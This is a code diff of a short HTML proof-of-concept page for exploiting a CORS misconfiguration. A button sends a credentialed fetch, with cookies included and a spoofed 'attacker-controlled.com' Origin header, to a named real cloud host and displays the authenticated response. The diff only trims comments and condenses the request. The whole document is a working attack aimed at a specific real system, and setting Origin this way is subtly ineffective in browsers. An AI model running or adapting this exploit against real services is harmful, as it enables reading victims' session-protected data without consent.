@@ -10,28 +10,19 @@
 
     <script>
         document.getElementById('exploitBtn').addEventListener('click', () => {
-            // Target URL with the CORS misconfiguration
-            const targetUrl = 'https://activelearning.int.cloud.microsoft.com';
-
-            // Perform the fetch request with credentials included
-            fetch(targetUrl, {
+            fetch('https://activelearning.int.cloud.microsoft.com', {
                 method: 'GET',
-                credentials: 'include', // Include cookies and session data
-                headers: {
-                    'Origin': 'https://your-malicious-domain.com' // Replace with your domain
-                }
+                credentials: 'include',
+                headers: { 'Origin': 'https://attacker-controlled.com' }
             })
             .then(response => response.text())
             .then(data => {
-                // Display the response from the server
                 document.getElementById('response').textContent = data;
             })
             .catch(err => {
-                // Display any errors that occur
                 document.getElementById('response').textContent = 'Error: ' + err;
             });
         });
     </script>
 </body>
 </html>
-
